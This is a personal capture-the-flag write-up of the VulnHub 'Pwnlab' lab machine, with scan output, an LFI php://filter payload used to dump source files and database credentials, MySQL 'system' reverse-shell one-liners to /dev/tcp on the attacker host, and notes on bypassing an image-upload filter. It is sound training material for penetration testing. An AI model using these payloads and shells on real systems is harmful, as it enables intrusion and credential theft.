<a href=https://gohugo.io/>Hugo</a></p></section></div></nav><section id=body><div id=overlay></div><div class="padding highlightable"><div><div id=top-bar><div id=breadcrumbs itemscope itemtype=http://data-vocabulary.org/Breadcrumb><span id=sidebar-toggle-span><a href=# id=sidebar-toggle data-sidebar-toggle><i class="fas fa-bars"></i></a></span><span id=toc-menu><i class="fas fa-list-alt"></i></span><span class=links><a href=/></a>> <a href=/notes/>Notes</a> > <a href=/notes/ctfs/>CTFs</a> > <a href=/notes/ctfs/vulnhub/>VulnHub</a> > Pwnlab</span></div><div class=progress><div class=wrapper><nav id=TableOfContents><ul><li><a href=#pwnlab>pwnlab</a><ul><li><a href=#info-overview>Info overview</a></li><li><a href=#where-you-at>where you at</a></li><li><a href=#what-you-got>what you got</a></li><li><a href=#19216856103---3306>192.168.56.103 - 3306</a></li><li><a href=#exploit>Exploit</a></li></ul></li></ul></nav></div></div></div></div><div id=head-tags><div class=tags><a class=tag-link href=/tags/vulnhub>VulnHub</a></div></div><div id=body-inner><h2 id=pwnlab>pwnlab</h2><h3 id=info-overview>Info overview</h3><h4 id=machine>Machine</h4><table><thead><tr><th>IP</th><th>Hostname</th><th>workgroup</th><th>OS</th></tr></thead><tbody><tr><td>192.168.56.103</td><td></td><td></td><td></td></tr></tbody></table><h4 id=ports-and-services>Ports and services</h4><table><thead><tr><th>port</th><th>Service/URL</th><th>Info</th></tr></thead><tbody><tr><td>80/tcp</td><td>http apache 2.4.10 some 5.X version of PHP</td><td>dir listing images/ upload/ LFI on page param <code>php://filter/convert.base64-encode/resource</code> application stores passwords in base64. see login.php</td></tr><tr><td>68/udp</td><td>dhcpc</td><td></td></tr><tr><td>111/tcp</td><td>rpcbind</td><td></td></tr><tr><td>111/udp</td><td>rpcbinv</td><td></td></tr><tr><td>3306/tcp</td><td>MariaDB (mysql) 5.5.47-0</td><td></td></tr><tr><td>505111/tcp</td><td>rpc</td><td></td></tr></tbody></table><h4 id=users-hashes-and-passwords>Users, hashes and Passwords</h4><h6 id=users>users</h6><table><thead><tr><th>users</th><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h6 id=passwords>passwords</h6><table><thead><tr><th>Creds</th><th>how did i get it</th><th>what can it access/info</th></tr></thead><tbody><tr><td>root:H4u%QJ_H99</td><td>php://filter/convert.base64-encode/resource=config</td><td>mysql root</td></tr><tr><td>kent:JWzXuBJJNy</td><td>mysql shell</td><td></td></tr><tr><td>mike:SIfdsTEn6I</td><td>mysql shell</td><td></td></tr><tr><td>kane:iSv5Ym2GRo</td><td>mysql shell</td><td></td></tr></tbody></table><h6 id=hashes>hashes</h6><table><thead><tr><th>user</th><th>hash</th><th>cracked</th></tr></thead><tbody><tr><td></td><td></td><td></td></tr></tbody></table><h4 id=vulns>Vulns</h4><table><thead><tr><th>Potential Vulns</th><th>Verified</th></tr></thead><tbody><tr><td><a href=https://www.exploit-db.com/exploits/40679>MySQL - Root Privilege Escalation PoC Exploit</a></td><td>[]</td></tr><tr><td><a href=https://www.exploit-db.com/exploits/40678>MySQL 5.5.x/5.6.x/5.7.x - &lsquo;mysql&rsquo; System User Privilege Escalation / Race Condition</a></td><td>[]</td></tr></tbody></table><h3 id=where-you-at>where you at</h3><pre><code class=language-bash>nmap -sn -PR 192.168.56.0/24 -oA scans/arp_scan
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-07 17:30 CET
Nmap scan report for 192.168.56.1
Host is up (0.00014s latency).
MAC Address: 0A:00:27:00:00:0A (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00014s latency).
MAC Address: 08:00:27:61:DA:0A (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.103
Host is up (0.00017s latency).
MAC Address: 08:00:27:D7:49:EB (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.07 seconds

</code></pre><h3 id=what-you-got>what you got</h3><h4 id=tcp>TCP</h4><pre><code class=language-bash># Nmap 7.80 scan initiated Tue Jan  7 17:31:57 2020 as: nmap -p- -A -oA scans/tcp 192.168.56.103
Nmap scan report for 192.168.56.103
Host is up (0.00032s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: PwnLab Intranet Image Hosting
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41188/udp   status
|   100024  1          50511/tcp   status
|   100024  1          56045/tcp6  status
|_  100024  1          59499/udp6  status
3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
| mysql-info:
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 38
|   Capabilities flags: 63487
|   Some Capabilities: ConnectWithDatabase, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, IgnoreSpaceBeforeParenthesis, SupportsCompression, FoundRows, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, SupportsLoadDataLocal, ODBCClient, LongPassword, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: 4{3+|PYOb|k$n~QXH@Dw
|_  Auth Plugin Name: mysql_native_password
505r11/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:D7:49:EB (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.32 ms 192.168.56.103

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan  7 17:32:14 2020 -- 1 IP address (1 host up) scanned in 18.10 seconds
</code></pre><h4 id=udp>UDP</h4><pre><code class=language-bash>nmap -sU  192.168.56.103 -oA scans/udp
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-07 19:40 CET
Nmap scan report for 192.168.56.103
Host is up (0.00046s latency).
Not shown: 998 closed ports
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
111/udp open          rpcbind
MAC Address: 08:00:27:D7:49:EB (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1095.87 seconds
</code></pre><h4 id=19216856103---80>192.168.56.103 - 80</h4><p>dir listing: <code>http://192.168.56.103/images/</code></p><p>old php version, terminate with null byte. <code>http://192.168.56.103/config%00.php</code></p><h4 id=nikto>nikto</h4><pre><code class=language-bash>nikto -h 192.168.56.103 -output scans/nikto.txt
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.103
+ Target Hostname:    192.168.56.103
+ Target Port:        80
+ Start Time:         2020-01-07 17:36:33 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ IP address found in the 'location' header. The IP is &quot;127.0.1.1&quot;.
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is &quot;127.0.1.1&quot;.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ Cookie PHPSESSID created without the httponly flag
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7915 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2020-01-07 17:37:41 (GMT1) (68 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
</code></pre><h6 id=gobuster>gobuster</h6><pre><code class=language-bash>root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab# ~/go/bin/gobuster dir -u http://192.168.56.103/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,sql -t 40 -e -o scans/gobuster_dir_med-php-txt-html-sql.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.56.103/
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,sql,php,txt
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/01/07 17:49:15 Starting gobuster
===============================================================
http://192.168.56.103/index.php (Status: 200)
http://192.168.56.103/images (Status: 301)
http://192.168.56.103/upload (Status: 301)
http://192.168.56.103/upload.php (Status: 200)
http://192.168.56.103/login.php (Status: 200)
http://192.168.56.103/config.php (Status: 200)
http://192.168.56.103/server-status (Status: 403)
===============================================================
2020/01/07 17:51:26 Finished
===============================================================
</code></pre><h6 id=kadimus>kadimus</h6><pre><code class=language-bash>root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# kadimus -u http://192.168.56.103/?page=login --parameter page --get-source --filename &quot;config&quot; -O config.php --proxy http://127.0.0.1:8080

(GET /?page=php://filter/convert.base64-encode/resource=config HTTP/1.1)


 _  __         _ _
| |/ /__ _  __| (_)_ __ ___  _   _ ___
| ' // _` |/ _` | | '_ ` _ \| | | / __|
| . \ (_| | (_| | | | | | | | |_| \__ \
|_|\_\__,_|\__,_|_|_| |_| |_|\__,_|___/

  v1.1 - LFI Scan &amp; Exploit Tool (@hc0d3r - P0cL4bs Team)

[19:37:04] [INFO] trying get source code of file: config
[19:37:04] [INFO] valid base64 returned:
[19:37:04] [INFO] check the output file

&lt;?php
$server      = &quot;localhost&quot;;
$username = &quot;root&quot;;
$password = &quot;H4u%QJ_H99&quot;;
$database = &quot;Users&quot;;
?&gt;



root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# kadimus -u http://192.168.56.103/?page=login --parameter page --get-source --filename &quot;login&quot; -O login.php  --proxy http://127.0.0.1:8080
 _  __         _ _
| |/ /__ _  __| (_)_ __ ___  _   _ ___
| ' // _` |/ _` | | '_ ` _ \| | | / __|
| . \ (_| | (_| | | | | | | | |_| \__ \
|_|\_\__,_|\__,_|_|_| |_| |_|\__,_|___/

  v1.1 - LFI Scan &amp; Exploit Tool (@hc0d3r - P0cL4bs Team)

[21:18:41] [INFO] trying get source code of file: login
[21:18:41] [INFO] valid base64 returned:
[21:18:41] [INFO] check the output file

&lt;?php
session_start();
require(&quot;config.php&quot;);
$mysqli = new mysqli($server, $username, $password, $database);

if (isset($_POST['user']) and isset($_POST['pass']))
{
        $luser = $_POST['user'];
        $lpass = base64_encode($_POST['pass']);

        $stmt = $mysqli-&gt;prepare(&quot;SELECT * FROM users WHERE user=? AND pass=?&quot;);
        $stmt-&gt;bind_param('ss', $luser, $lpass);

        $stmt-&gt;execute();
        $stmt-&gt;store_Result();

        if ($stmt-&gt;num_rows == 1)
        {
                $_SESSION['user'] = $luser;
                header('Location: ?page=upload');
        }
        else
        {
                echo &quot;Login failed.&quot;;
        }
}
else
{
        ?&gt;
        &lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;
        &lt;label&gt;Username: &lt;/label&gt;&lt;input id=&quot;user&quot; type=&quot;test&quot; name=&quot;user&quot;&gt;&lt;br /&gt;
        &lt;label&gt;Password: &lt;/label&gt;&lt;input id=&quot;pass&quot; type=&quot;password&quot; name=&quot;pass&quot;&gt;&lt;br /&gt;
        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;
        &lt;/form&gt;
        &lt;?php
}

root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# kadimus -u http://192.168.56.103/?page=login --parameter page --get-source --filename &quot;upload&quot; -O upload.php  #--proxy http://127.0.0.1:808
 _  __         _ _
| |/ /__ _  __| (_)_ __ ___  _   _ ___
| ' // _` |/ _` | | '_ ` _ \| | | / __|
| . \ (_| | (_| | | | | | | | |_| \__ \
|_|\_\__,_|\__,_|_|_| |_| |_|\__,_|___/

  v1.1 - LFI Scan &amp; Exploit Tool (@hc0d3r - P0cL4bs Team)

[22:19:17] [INFO] trying get source code of file: upload
[22:19:17] [INFO] valid base64 returned:
[22:19:18] [INFO] check the output file

&lt;?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?&gt;
&lt;html&gt;
    &lt;body&gt;
        &lt;form action='' method='post' enctype='multipart/form-data'&gt;
            &lt;input type='file' name='file' id='file' /&gt;
            &lt;input type='submit' name='submit' value='Upload'/&gt;
        &lt;/form&gt;
    &lt;/body&gt;
&lt;/html&gt;
&lt;?php
if(isset($_POST['submit'])) {
    if ($_FILES['file']['error'] &lt;= 0) {
        $filename  = $_FILES['file']['name'];
        $filetype  = $_FILES['file']['type'];
        $uploaddir = 'upload/';
        $file_ext  = strrchr($filename, '.');
        $imageinfo = getimagesize($_FILES['file']['tmp_name']);
        $whitelist = array(&quot;.jpg&quot;,&quot;.jpeg&quot;,&quot;.gif&quot;,&quot;.png&quot;);

        if (!(in_array($file_ext, $whitelist))) {
            die('Not allowed extension, please upload images only.');
        }

        if(strpos($filetype,'image') === false) {
            die('Error 001');
        }

        if($imageinfo['mime'] != 'image/gif' &amp;&amp; $imageinfo['mime'] != 'image/jpeg' &amp;&amp; $imageinfo['mime'] != 'image/jpg'&amp;&amp; $imageinfo['mime'] != 'image/png') {
            die('Error 002');
        }

        if(substr_count($filetype, '/')&gt;1){
            die('Error 003');
        }

        $uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
            echo &quot;&lt;img src=\&quot;&quot;.$uploadfile.&quot;\&quot;&gt;&lt;br /&gt;&quot;;
        } else {
            die('Error 4');
        }
    }
}

?&gt;
</code></pre><h3 id=19216856103---3306>192.168.56.103 - 3306</h3><pre><code class=language-bash>mysql -u root --host 192.168.56.103
ERROR 1045 (28000): Access denied for user 'root'@'192.168.56.102' (using password: NO)
</code></pre><h3 id=exploit>Exploit</h3><h4 id=passwords-1>passwords</h4><pre><code class=language-sql>Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 123
Server version: 5.5.47-0+deb8u1 (Debian)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]&gt;
MySQL [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Users              |
+--------------------+
2 rows in set (0.001 sec)

MySQL [(none)]&gt; use Users
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [Users]&gt; show tables;
+-----------------+
| Tables_in_Users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.001 sec)

MySQL [Users]&gt; select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
3 rows in set (0.001 sec)

MySQL [(none)]&gt; help;

General information about MariaDB can be found at
http://mariadb.org

List of all MySQL commands:
Note that all text commands must be first on line and end with ';'
?         (\?) Synonym for `help'.
clear     (\c) Clear the current input statement.
connect   (\r) Reconnect to the server. Optional arguments are db and host.
delimiter (\d) Set statement delimiter.
edit      (\e) Edit command with $EDITOR.
ego       (\G) Send command to mysql server, display result vertically.
exit      (\q) Exit mysql. Same as quit.
go        (\g) Send command to mysql server.
help      (\h) Display this help.
nopager   (\n) Disable pager, print to stdout.
notee     (\t) Don't write into outfile.
pager     (\P) Set PAGER [to_pager]. Print the query results via PAGER.
print     (\p) Print current command.
prompt    (\R) Change your mysql prompt.
quit      (\q) Quit mysql.
rehash    (\#) Rebuild completion hash.
source    (\.) Execute an SQL script file. Takes a file name as an argument.
status    (\s) Get status information from the server.
system    (\!) Execute a system shell command.
tee       (\T) Set outfile [to_outfile]. Append everything into given outfile.
use       (\u) Use another database. Takes database name as argument.
charset   (\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.
warnings  (\W) Show warnings after every statement.
nowarning (\w) Don't show warnings after every statement.

For server side help, type 'help contents'

MySQL [(none)]&gt; tee
No previous outfile available, you must give a filename!
</code></pre><pre><code class=language-bash>root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# echo Sld6WHVCSkpOeQ== | base64 -d
JWzXuBJJNy
root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# echo U0lmZHNURW42SQ== | base64 -d
SIfdsTEn6I
root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# echo aVN2NVltMkdSbw== | base64 -d
iSv5Ym2GRo
</code></pre><h4 id=mysql-shell-to-local-shell>mysql shell to local shell</h4><p>I was today years old when I learned that system command of mysql runs LOCAL not remote.</p><p><img src=https://raw.githubusercontent.com/justin-p/my-notes-and-snippets/master/.gitbook/assets/IMG/pwnlab_localshelll.png alt=png></p><p><img src=https://raw.githubusercontent.com/justin-p/my-notes-and-snippets/master/.gitbook/assets/IMG/pwnlab_localshelll.gif alt=gif></p><pre><code class=language-bash>root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# nc -nlvp 808
listening on [any] 808 ...
192.168.56.102: inverse host lookup failed: Unknown host
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.102] 36662
</code></pre><pre><code class=language-bash>MySQL [(none)]&gt; system
ERROR: Usage: \! shell-command
MySQL [(none)]&gt; system ls
config.php  login.php
MySQL [(none)]&gt; system bash -i &gt;&amp; /dev/tcp/192.168.56.102/808 0&gt;&amp;1
sh: 1: Syntax error: Bad fd number
MySQL [(none)]&gt; system sh -i &gt;&amp; /dev/tcp/192.168.56.102/808 0&gt;&amp;1
sh: 1: Syntax error: Bad fd number
MySQL [(none)]&gt; system bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.102/808 0&gt;&amp;1&quot;
</code></pre><h4 id=upload-via-web>upload via web</h4><p>use creds from DB. Login.</p><p>upload page checks 3 things.</p><ul><li>Extensions</li><li>image file type with [&lsquo;type&rsquo;]</li><li>mime data with getimagesize</li></ul><p>so upload a shell.jpg.php with a magic byte</p><pre><code class=language-php>$filename  = $_FILES['file']['name'];
$filetype  = $_FILES['file']['type'];
$uploaddir = 'upload/';
$file_ext  = strrchr($filename, '.');
$imageinfo = getimagesize($_FILES['file']['tmp_name']);
$whitelist = array(&quot;.jpg&quot;,&quot;.jpeg&quot;,&quot;.gif&quot;,&quot;.png&quot;);
if (!(in_array($file_ext, $whitelist))) {
    die('Not allowed extension, please upload images only.');
}
if(strpos($filetype,'image') === false) {
    die('Error 001');
}
if($imageinfo['mime'] != 'image/gif' &amp;&amp; $imageinfo['mime'] != 'image/jpeg' &amp;&amp; $imageinfo['mime'] != 'image/jpg'&amp;&amp; $imageinfo['mime'] != 'image/png') {
    die('Error 002');
}
if(substr_count($filetype, '/')&gt;1){
    die('Error 003');
}
</code></pre><footer class=footline></footer></div></div><div id=navigation></div></section><div style=left:-1000px;overflow:scroll;position:absolute;top:-1000px;border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px><div style=border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px></div></div><script src=/js/clipboard.min.js></script><script src=/js/perfect-scrollbar.min.js></script><script src=/js/perfect-scrollbar.jquery.min.js></script><script src=/js/jquery.sticky.js></script><script src=/js/featherlight.min.js></script><script src=/js/highlight.pack.js></script><script>hljs.initHighlightingOnLoad();</script><script src=/js/modernizr.custom-3.6.0.js></script><script src=/js/learn.js></script><script src=/js/hugo-learn.js></script><link href=/mermaid/mermaid.css rel=stylesheet><script src=/mermaid/mermaid.js></script><script>mermaid.initialize({startOnLoad:true});</script></body></html>